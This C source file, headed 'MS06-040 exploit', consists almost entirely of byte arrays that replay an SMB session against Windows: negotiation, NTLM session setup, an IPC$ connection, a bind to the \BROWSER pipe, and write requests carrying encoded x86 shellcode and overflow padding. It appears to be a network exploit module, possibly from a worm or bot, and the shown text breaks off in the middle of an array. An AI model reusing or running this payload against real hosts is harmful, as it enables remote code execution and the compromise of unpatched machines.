/* MS06-040 exploit */
#include "include.h"
#include "extern.h"

#pragma warning(disable : 4305)
#pragma warning(disable : 4309)
char peer0_0[] = {
0x81, 0x00, 0x00, 0x44, 0x20, 0x43, 0x4b, 0x46, 
0x44, 0x45, 0x4e, 0x45, 0x43, 0x46, 0x44, 0x45, 
0x46, 0x46, 0x43, 0x46, 0x47, 0x45, 0x46, 0x46, 
0x43, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 
0x41, 0x43, 0x41, 0x43, 0x41, 0x00, 0x20, 0x43, 
0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 
0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 
0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 0x41, 0x43, 
0x41, 0x43, 0x41, 0x43, 0x41, 0x41, 0x41, 0x00 };

char peer0_1[] = {
0x00, 0x00, 0x00, 0x54, 0xff, 0x53, 0x4d, 0x42, 
0x72, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x1d, 
0x00, 0x00, 0x84, 0xec, 0x00, 0x31, 0x00, 0x02, 
0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x31, 0x2e, 
0x30, 0x00, 0x02, 0x4c, 0x4d, 0x31, 0x2e, 0x32, 
0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4e, 0x54, 
0x20, 0x4c, 0x41, 0x4e, 0x4d, 0x41, 0x4e, 0x20, 
0x31, 0x2e, 0x30, 0x00, 0x02, 0x4e, 0x54, 0x20, 
0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00 };

char peer0_2[] = {
0x00, 0x00, 0x00, 0xb5, 0xff, 0x53, 0x4d, 0x42, 
0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x1d, 
0x00, 0x00, 0x84, 0xec, 0x0c, 0xff, 0x00, 0x00, 
0x00, 0xdf, 0xff, 0x02, 0x00, 0x01, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x57, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x5c, 0xd0, 0x00, 0x80, 0x7a, 0x00, 0x60, 
0x55, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 
0x02, 0xa0, 0x4b, 0x30, 0x49, 0xa0, 0x0e, 0x30, 
0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04, 0x01, 
0x82, 0x37, 0x02, 0x02, 0x0a, 0xa2, 0x37, 0x04, 
0x35, 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 
0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x02, 0x08, 
0x00, 0x09, 0x00, 0x09, 0x00, 0x20, 0x00, 0x00, 
0x00, 0x0c, 0x00, 0x0c, 0x00, 0x29, 0x00, 0x00, 
0x00, 0x57, 0x4f, 0x52, 0x4b, 0x47, 0x52, 0x4f, 
0x55, 0x50, 0x57, 0x4f, 0x52, 0x4b, 0x53, 0x54, 
0x41, 0x54, 0x49, 0x4f, 0x4e, 0x31, 0x57, 0x69, 
0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 0x30, 
0x30, 0x30, 0x20, 0x32, 0x31, 0x39, 0x35, 0x00, 
0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 
0x32, 0x30, 0x30, 0x30, 0x20, 0x35, 0x2e, 0x30, 
0x00 };

char peer0_3[] = {
0x00, 0x00, 0x01, 0x04, 0xff, 0x53, 0x4d, 0x42, 
0x73, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x28, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x0c, 0xff, 0x00, 0x00, 
0x00, 0xdf, 0xff, 0x02, 0x00, 0x01, 0x00, 0x00, 
0x00, 0x00, 0x00, 0xa6, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x5c, 0xd0, 0x00, 0x80, 0xc9, 0x00, 0xa1, 
0x81, 0xa3, 0x30, 0x81, 0xa0, 0xa2, 0x81, 0x9d, 
0x04, 0x81, 0x9a, 0x4e, 0x54, 0x4c, 0x4d, 0x53, 
0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 
0x00, 0x18, 0x00, 0x40, 0x00, 0x00, 0x00, 0x18, 
0x00, 0x18, 0x00, 0x58, 0x00, 0x00, 0x00, 0x12, 
0x00, 0x12, 0x00, 0x70, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x82, 0x00, 0x00, 0x00, 0x18, 
0x00, 0x18, 0x00, 0x82, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
0x02, 0x08, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 
0x05, 0x06, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x25, 0xa6, 0x9f, 0x80, 0x96, 
0x31, 0x6c, 0xca, 0xa0, 0x08, 0x9f, 0x12, 0x7e, 
0x47, 0xcd, 0x45, 0x10, 0x25, 0x39, 0x7d, 0xf8, 
0x55, 0x66, 0x03, 0x57, 0x00, 0x4f, 0x00, 0x52, 
0x00, 0x4b, 0x00, 0x47, 0x00, 0x52, 0x00, 0x4f, 
0x00, 0x55, 0x00, 0x50, 0x00, 0x57, 0x00, 0x4f, 
0x00, 0x52, 0x00, 0x4b, 0x00, 0x53, 0x00, 0x54, 
0x00, 0x41, 0x00, 0x54, 0x00, 0x49, 0x00, 0x4f, 
0x00, 0x4e, 0x00, 0x31, 0x00, 0x57, 0x69, 0x6e, 
0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 0x30, 0x30, 
0x30, 0x20, 0x32, 0x31, 0x39, 0x35, 0x00, 0x57, 
0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x32, 
0x30, 0x30, 0x30, 0x20, 0x35, 0x2e, 0x30, 0x00 };

char peer0_4[] = {
0x00, 0x00, 0x00, 0x3a, 0xff, 0x53, 0x4d, 0x42, 
0x75, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x04, 0xff, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x01, 0x00, 0x0f, 0x00, 0x00, 
0x5c, 0x5c, 0x5c, 0x49, 0x50, 0x43, 0x24, 0x00, 
0x3f, 0x3f, 0x3f, 0x3f, 0x3f, 0x00 };

char peer0_5[] = {
0x00, 0x00, 0x00, 0x5c, 0xff, 0x53, 0x4d, 0x42, 
0xa2, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x18, 0xff, 0x00, 0x00, 
0x00, 0x00, 0x08, 0x00, 0x16, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x9f, 0x01, 0x02, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 
0x01, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 
0x02, 0x00, 0x00, 0x00, 0x00, 0x09, 0x00, 0x5c, 
0x42, 0x52, 0x4f, 0x57, 0x53, 0x45, 0x52, 0x00 };

char peer0_6[] = {
0x00, 0x00, 0x00, 0x92, 0xff, 0x53, 0x4d, 0x42, 
0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x10, 0x00, 0x00, 0x48, 
0x00, 0x00, 0x04, 0xe0, 0xff, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x4a, 0x00, 0x48, 0x00, 0x4a, 0x00, 0x02, 
0x00, 0x26, 0x00, 0x00, 0x40, 0x4f, 0x00, 0x5c, 
0x50, 0x49, 0x50, 0x45, 0x5c, 0x00, 0x05, 0x00, 
0x0b, 0x03, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd0, 0x16, 
0xd0, 0x16, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0xc8, 0x4f, 
0x32, 0x4b, 0x70, 0x16, 0xd3, 0x01, 0x12, 0x78, 
0x5a, 0x47, 0xbf, 0x6e, 0xe1, 0x88, 0x03, 0x00, 
0x00, 0x00, 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 
0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 
0x48, 0x60, 0x02, 0x00, 0x00, 0x00 };

char peer0_7[] = {
0x00, 0x00, 0x01, 0x57, 0xff, 0x53, 0x4d, 0x42, 
0x2f, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x0e, 0xff, 0x00, 0x00, 
0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0xff, 
0xff, 0xff, 0xff, 0x08, 0x00, 0x18, 0x01, 0x00, 
0x00, 0x18, 0x01, 0x3f, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x18, 0x01, 0x05, 0x00, 0x00, 0x01, 0x10, 
0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0x00, 0x1c, 0x67, 0xc4, 0x18, 0x01, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
0x00, 0x00, 0x00, 0x00, 0x00, 0xbf, 0x34, 0x63, 
0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 
0x01, 0x00, 0x00, 0x93, 0x48, 0x96, 0x48, 0xfc, 
0x40, 0x93, 0x98, 0xf9, 0x98, 0x9f, 0x9f, 0x96, 
0x37, 0x27, 0x90, 0x40, 0x9f, 0x4b, 0x4e, 0xd6, 
0x93, 0x2b, 0xc9, 0x83, 0xe9, 0xaf, 0xd9, 0xee, 
0xd9, 0x74, 0x24, 0xf4, 0x5b, 0x81, 0x73, 0x13, 
0x2d, 0x2a, 0xd8, 0xe9, 0x83, 0xeb, 0xfc, 0xe2, 
0xf4, 0xac, 0xee, 0x27, 0x06, 0xd2, 0xd5, 0x9c, 
0x15, 0x47, 0xc1, 0x95, 0x01, 0xd4, 0xd5, 0x27, 
0x16, 0x4d, 0xa1, 0xb4, 0xcd, 0x09, 0xa1, 0x9d, 
0xd5, 0xa6, 0x56, 0xdd, 0x91, 0x2c, 0xc5, 0x53, 
0xa6, 0x35, 0xa1, 0x87, 0xc9, 0x2c, 0xc1, 0x91, 
0x62, 0x19, 0xa1, 0xd9, 0x07, 0x1c, 0xea, 0x41, 
0x45, 0xa9, 0xea, 0xac, 0xee, 0xec, 0xe0, 0xd5, 
0xe8, 0xef, 0xc1, 0x2c, 0xd2, 0x79, 0x0e, 0xf0, 
0x9c, 0xc8, 0xa1, 0x87, 0xcd, 0x2c, 0xc1, 0xbe, 
0x62, 0x21, 0x61, 0x53, 0xb6, 0x31, 0x2b, 0x33, 
0xea, 0x01, 0xa1, 0x51, 0x85, 0x09, 0x36, 0xb9, 
0x2a, 0x1c, 0xf1, 0xbc, 0x62, 0x6e, 0x1a, 0x53, 
0xa9, 0x21, 0xa1, 0xa8, 0xf5, 0x80, 0xa1, 0x98, 
0xe1, 0x73, 0x42, 0x56, 0xa7, 0x23, 0xc6, 0x88, 
0x16, 0xfb, 0x4c, 0x8b, 0x8f, 0x45, 0x19, 0xea, 
0x81, 0x5a, 0x59, 0xea, 0xb6, 0x79, 0xd5, 0x08, 
0x81, 0xe6, 0xc7, 0x24, 0xd2, 0x7d, 0xd5, 0x0e, 
0xb6, 0xa4, 0xcf, 0xbe, 0x68, 0xc0, 0x22, 0xda, 
0xbc, 0x47, 0x28, 0x27, 0x39, 0x45, 0xf3, 0xd1, 
0x1c, 0x80, 0x7d, 0x27, 0x3f, 0x7e, 0x79, 0x8b, 
0xba, 0x7e, 0x69, 0x8b, 0xaa, 0x7e, 0xd5, 0x08, 
0x8f, 0x45, 0xfe, 0xe9, 0x8f, 0x7e, 0xa3, 0x39, 
0x7c, 0x45, 0x8e };

char peer0_8[] = {
0x00, 0x00, 0x01, 0x57, 0xff, 0x53, 0x4d, 0x42, 
0x2f, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x0e, 0xff, 0x00, 0x00, 
0x00, 0x00, 0x40, 0x18, 0x01, 0x00, 0x00, 0xff, 
0xff, 0xff, 0xff, 0x08, 0x00, 0x18, 0x01, 0x00, 
0x00, 0x18, 0x01, 0x3f, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x18, 0x01, 0x05, 0x00, 0x00, 0x00, 0x10, 
0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0x00, 0xc2, 0x99, 0xea, 0x7d, 0x27, 
0x3f, 0x47, 0x3a, 0x89, 0xbc, 0xd2, 0xfa, 0xb0, 
0x4d, 0x80, 0x04, 0x31, 0xbe, 0xd2, 0xfc, 0x8b, 
0xbc, 0xd2, 0xfa, 0xb0, 0x0c, 0x64, 0xac, 0x91, 
0xbe, 0xd2, 0xfc, 0x88, 0xbd, 0x79, 0x7f, 0x27, 
0x39, 0xbe, 0x42, 0x3f, 0x90, 0xeb, 0x53, 0x8f, 
0x16, 0xfb, 0x7f, 0x27, 0x39, 0x4b, 0x40, 0xbc, 
0x8f, 0x45, 0x49, 0xb5, 0x60, 0xc8, 0x40, 0x88, 
0xb0, 0x04, 0xe6, 0x51, 0x0e, 0x47, 0x6e, 0x51, 
0x0b, 0x1c, 0xea, 0x2b, 0x43, 0xd3, 0x68, 0xf5, 
0x17, 0x6f, 0x06, 0x4b, 0x64, 0x57, 0x12, 0x73, 
0x42, 0x86, 0x42, 0xaa, 0x17, 0x9e, 0x3c, 0x27, 
0x9c, 0x69, 0xd5, 0x0e, 0xb2, 0x7a, 0x78, 0x89, 
0xb8, 0x7c, 0x40, 0xd9, 0xb8, 0x7c, 0x7f, 0x89, 
0x16, 0xfd, 0x42, 0x75, 0x30, 0x28, 0xe4, 0x8b, 
0x16, 0xfb, 0x40, 0x27, 0x16, 0x1a, 0xd5, 0x08, 
0x62, 0x7a, 0xd6, 0x5b, 0x2d, 0x49, 0xd5, 0x0e, 
0xbb, 0xd2, 0xfa, 0xb0, 0x06, 0xe3, 0xca, 0xb8, 
0xba, 0xd2, 0xfc, 0x27, 0x39, 0x61, 0x72, 0x5a, 
0x34, 0x54, 0x46, 0x4c, 0x45, 0x44, 0x38, 0x4f, 
0x6a, 0x44, 0x33, 0x41, 0x49, 0x43, 0x49, 0x53, 
0x52, 0x37, 0x41, 0x31, 0x34, 0x67, 0x66, 0x70, 
0x41, 0x47, 0x41, 0x49, 0x34, 0x4d, 0x76, 0x75, 
0x62, 0x31, 0x79, 0x57, 0x54, 0x64, 0x54, 0x5a, 
0x6f, 0x45, 0x6e, 0x47, 0x71, 0x67, 0x52, 0x31, 
0x66, 0x45, 0x5a, 0x6d, 0x41, 0x71, 0x39, 0x4c, 
0x4c, 0x7a, 0x48, 0x6f, 0x50, 0x74, 0x4c, 0x47, 
0x61, 0x6a, 0x30, 0x55, 0x69, 0x68, 0x7a, 0x7a, 
0x6b, 0x69, 0x33, 0x4c, 0x70, 0x34, 0x47, 0x53, 
0x4a, 0x54, 0x74, 0x39, 0x58, 0x33, 0x78, 0x43, 
0x67, 0x54, 0x74, 0x58, 0x77, 0x32, 0x77, 0x42, 
0x52, 0x4d, 0x57, 0x70, 0x36, 0x75, 0x38, 0x33, 
0x52, 0x66, 0x79 };

char peer0_9[] = {
0x00, 0x00, 0x01, 0x57, 0xff, 0x53, 0x4d, 0x42, 
0x2f, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x0e, 0xff, 0x00, 0x00, 
0x00, 0x00, 0x40, 0x30, 0x02, 0x00, 0x00, 0xff, 
0xff, 0xff, 0xff, 0x08, 0x00, 0x18, 0x01, 0x00, 
0x00, 0x18, 0x01, 0x3f, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x18, 0x01, 0x05, 0x00, 0x00, 0x00, 0x10, 
0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0x00, 0x52, 0x36, 0x36, 0x37, 0x4e, 
0x54, 0x6f, 0x48, 0x76, 0x51, 0x32, 0x63, 0x68, 
0x67, 0x36, 0x68, 0x43, 0x39, 0x54, 0x46, 0x4b, 
0x67, 0x79, 0x56, 0x57, 0x53, 0x45, 0x39, 0x42, 
0x4a, 0x65, 0x4f, 0x57, 0x73, 0x42, 0x6b, 0x39, 
0x52, 0x76, 0x31, 0x56, 0x42, 0x6e, 0x42, 0x70, 
0x75, 0x42, 0x46, 0x58, 0x35, 0x48, 0x46, 0x62, 
0x4a, 0x78, 0x6d, 0x33, 0x53, 0x50, 0x34, 0x30, 
0x7a, 0x76, 0x46, 0x6c, 0x4f, 0x54, 0x37, 0x6a, 
0x4a, 0x45, 0x59, 0x54, 0x6f, 0x69, 0x62, 0x36, 
0x65, 0x57, 0x6a, 0x32, 0x44, 0x63, 0x31, 0x65, 
0x4b, 0x36, 0x59, 0x55, 0x33, 0x32, 0x38, 0x78, 
0x5a, 0x64, 0x42, 0x75, 0x56, 0x79, 0x52, 0x70, 
0x36, 0x33, 0x47, 0x45, 0x7a, 0x31, 0x72, 0x36, 
0x51, 0x50, 0x35, 0x70, 0x4f, 0x58, 0x59, 0x31, 
0x75, 0x32, 0x39, 0x70, 0x74, 0x50, 0x41, 0x6a, 
0x34, 0x65, 0x7a, 0x78, 0x69, 0x50, 0x59, 0x0a, 
0x08, 0x02, 0x00, 0x4a, 0x52, 0x57, 0x6c, 0x39, 
0x50, 0x77, 0x38, 0x04, 0x08, 0x02, 0x00, 0x32, 
0x37, 0x49, 0x49, 0x56, 0x6d, 0x6f, 0x55, 0x68, 
0x56, 0x69, 0x51, 0x41, 0x35, 0x43, 0x4c, 0x47, 
0x6b, 0x4f, 0x45, 0x30, 0x51, 0x36, 0x52, 0x30, 
0x6f, 0x64, 0x74, 0x78, 0x65, 0x32, 0x70, 0x04, 
0x08, 0x02, 0x00, 0x35, 0x79, 0x78, 0x32, 0x78, 
0x70, 0x38, 0x35, 0x04, 0x08, 0x02, 0x00, 0x51, 
0x67, 0x39, 0x36, 0x4a, 0x71, 0x65, 0x72, 0x56, 
0x55, 0x47, 0x58, 0x53, 0x58, 0x59, 0x4f, 0x61, 
0x61, 0x7a, 0x47, 0x62, 0x48, 0x56, 0x61, 0x73, 
0x33, 0x4d, 0x4b, 0x34, 0x42, 0x39, 0x79, 0x00, 
0x00, 0xbf, 0xf9, 0x78, 0x00, 0x00, 0x00, 0x01, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
0x00, 0x00, 0x00, 0x00, 0x00, 0xb4, 0xee, 0x7b, 
0x00, 0x00, 0x00 };

char peer0_10[] = {
0x00, 0x00, 0x00, 0x66, 0xff, 0x53, 0x4d, 0x42, 
0x25, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x10, 0x00, 0x00, 0x1c, 
0x00, 0x00, 0x04, 0xe0, 0xff, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x4a, 0x00, 0x1c, 0x00, 0x4a, 0x00, 0x02, 
0x00, 0x26, 0x00, 0x00, 0x40, 0x23, 0x00, 0x5c, 
0x50, 0x49, 0x50, 0x45, 0x5c, 0x00, 0x05, 0x00, 
0x00, 0x02, 0x10, 0x00, 0x00, 0x00, 0x1c, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x1f, 0x00, 0x00, 0x00, 
0x00, 0x00 };

char peer0_11[] = {
0x00, 0x00, 0x01, 0x57, 0xff, 0x53, 0x4d, 0x42, 
0x2f, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x0e, 0xff, 0x00, 0x00, 
0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0xff, 
0xff, 0xff, 0xff, 0x08, 0x00, 0x18, 0x01, 0x00, 
0x00, 0x18, 0x01, 0x3f, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x18, 0x01, 0x05, 0x00, 0x00, 0x01, 0x10, 
0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0x00, 0x1c, 0x67, 0xc4, 0x18, 0x01, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
0x00, 0x00, 0x00, 0x00, 0x00, 0xbf, 0x34, 0x63, 
0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 
0x01, 0x00, 0x00, 0x93, 0x48, 0x96, 0x48, 0xfc, 
0x40, 0x93, 0x98, 0xf9, 0x98, 0x9f, 0x9f, 0x96, 
0x37, 0x27, 0x90, 0x40, 0x9f, 0x4b, 0x4e, 0xd6, 
0x93, 0x2b, 0xc9, 0x83, 0xe9, 0xaf, 0xd9, 0xee, 
0xd9, 0x74, 0x24, 0xf4, 0x5b, 0x81, 0x73, 0x13, 
0x2d, 0x2a, 0xd8, 0xe9, 0x83, 0xeb, 0xfc, 0xe2, 
0xf4, 0xac, 0xee, 0x27, 0x06, 0xd2, 0xd5, 0x9c, 
0x15, 0x47, 0xc1, 0x95, 0x01, 0xd4, 0xd5, 0x27, 
0x16, 0x4d, 0xa1, 0xb4, 0xcd, 0x09, 0xa1, 0x9d, 
0xd5, 0xa6, 0x56, 0xdd, 0x91, 0x2c, 0xc5, 0x53, 
0xa6, 0x35, 0xa1, 0x87, 0xc9, 0x2c, 0xc1, 0x91, 
0x62, 0x19, 0xa1, 0xd9, 0x07, 0x1c, 0xea, 0x41, 
0x45, 0xa9, 0xea, 0xac, 0xee, 0xec, 0xe0, 0xd5, 
0xe8, 0xef, 0xc1, 0x2c, 0xd2, 0x79, 0x0e, 0xf0, 
0x9c, 0xc8, 0xa1, 0x87, 0xcd, 0x2c, 0xc1, 0xbe, 
0x62, 0x21, 0x61, 0x53, 0xb6, 0x31, 0x2b, 0x33, 
0xea, 0x01, 0xa1, 0x51, 0x85, 0x09, 0x36, 0xb9, 
0x2a, 0x1c, 0xf1, 0xbc, 0x62, 0x6e, 0x1a, 0x53, 
0xa9, 0x21, 0xa1, 0xa8, 0xf5, 0x80, 0xa1, 0x98, 
0xe1, 0x73, 0x42, 0x56, 0xa7, 0x23, 0xc6, 0x88, 
0x16, 0xfb, 0x4c, 0x8b, 0x8f, 0x45, 0x19, 0xea, 
0x81, 0x5a, 0x59, 0xea, 0xb6, 0x79, 0xd5, 0x08, 
0x81, 0xe6, 0xc7, 0x24, 0xd2, 0x7d, 0xd5, 0x0e, 
0xb6, 0xa4, 0xcf, 0xbe, 0x68, 0xc0, 0x22, 0xda, 
0xbc, 0x47, 0x28, 0x27, 0x39, 0x45, 0xf3, 0xd1, 
0x1c, 0x80, 0x7d, 0x27, 0x3f, 0x7e, 0x79, 0x8b, 
0xba, 0x7e, 0x69, 0x8b, 0xaa, 0x7e, 0xd5, 0x08, 
0x8f, 0x45, 0xfe, 0xe9, 0x8f, 0x7e, 0xa3, 0x39, 
0x7c, 0x45, 0x8e };

char peer0_12[] = {
0x00, 0x00, 0x01, 0x57, 0xff, 0x53, 0x4d, 0x42, 
0x2f, 0x00, 0x00, 0x00, 0x00, 0x18, 0x01, 0x20, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x30, 0x1d, 
0x00, 0x08, 0x84, 0xec, 0x0e, 0xff, 0x00, 0x00, 
0x00, 0x00, 0x40, 0x18, 0x01, 0x00, 0x00, 0xff, 
0xff, 0xff, 0xff, 0x08, 0x00, 0x18, 0x01, 0x00, 
0x00, 0x18, 0x01, 0x3f, 0x00, 0x00, 0x00, 0x00, 
0x00, 0x18, 0x01, 0x05, 0x00, 0x00, 0x00, 0x10, 
0x00, 0x00, 0x00, 0x18, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
0x00, 0x1f, 0x00, 0xc2, 0x99, 0xea, 0x7d, 0x27, 
0x3f, 0x47, 0x3a, 0x89, 0xbc, 0xd2, 0xfa, 0xb0, 
0x4d, 0x80, 0x04, 0x31, 0xbe, 0xd2, 0xfc, 0x8b, 
0xbc, 0xd2, 0xfa, 0xb0, 0x0c, 0x64, 0xac, 0x91, 
0xbe, 0xd2, 0xfc, 0x88, 0xbd, 0x79, 0x7f, 0x27, 
0x39, 0xbe, 0x42, 0x3f, 0x90, 0xeb, 0x53, 0x8f, 
0x16, 0xfb, 0x7f, 0x27, 0x39, 0x4b, 0x40, 0xbc, 
0x8f, 0x45, 0x49, 0xb5, 0x60, 0xc8, 0x40, 0x88, 
0xb0, 0x04, 0xe6, 0x51, 0x0e, 0x47, 0x6e, 0x51, 
0x0b, 0x1c, 0xea, 0x2b, 0x43, 0xd3, 0x68, 0xf5, 
0x17, 0x6f, 0x06, 0x4b, 0x64, 0x57, 0x12, 0x73, 
0x42, 0x86, 0x42, 0xaa, 0x17, 0x9e, 0x3c, 0x27, 
0x9c, 0x69, 0xd5, 0x0e, 0xb2, 0x7a, 0x78, 0x89, 
0xb8, 0x7c, 0x40, 0xd9, 0xb8, 0x7c, 0x7f, 0x89, 
0x16, 0xfd, 0x42, 0x75, 0x30, 0x28, 0xe4, 0x8b, 
0x16, 0xfb, 0x40, 0x27, 0x16, 0x1a, 0xd5, 0x08, 
0x62, 0x7a, 0xd6, 0x5b, 0x2d, 0x49, 0xd5, 0x0e, 
0xbb, 0xd2, 0xfa, 0xb0, 0x06, 0xe3, 0xca, 0xb8, 
0xba, 0xd2, 0xfc, 0x27, 0x39, 0x61, 0x72, 0x5a, 
0x34, 0x54, 0x46, 0x4c, 0x45, 0x44, 0x38, 0x4f, 
0x6a, 0x44, 0x33, 0x41, 0x49, 0x43, 0x49, 0x53, 
0x52, 0x37, 0x41, 0x31, 0x34, 0x67, 0x66, 0x70, 
0x41, 0x47, 0x41, 0x49, 0x34, 0x4d, 0x76, 0x75, 
0x62, 0x31, 0x79, 0x57, 0x54, 0x64, 0x54, 0x5a, 
0x6f, 0x45, 0x6e, 0x47, 0x71, 0x67, 0x52, 0x31, 
0x66, 0x45, 0x5a, 0x6d, 0x41, 0x71, 0x39, 0x4c, 
0x4c, 0x7a, 0x48, 0x6f, 0x50, 0x74, 0x4c, 0x47, 
0x61, 0x6a, 0x30, 0x55, 0x69, 0x68, 0x7a, 0x7a, 
0x6b, 0x69, 0x33, 0x4c, 0x70, 0x34, 0x47, 0x53, 
0x4a, 0x54, 0x74, 0x39, 0x58, 0x33, 0x78, 0x43, 
0x67, 0x54, 0x74, 0x58, 0x77, 0x32, 0x77, 0x42, 
0x52, 0x4d, 0x57, 0x70, 0x36, 0x75, 0x38, 0x33, 
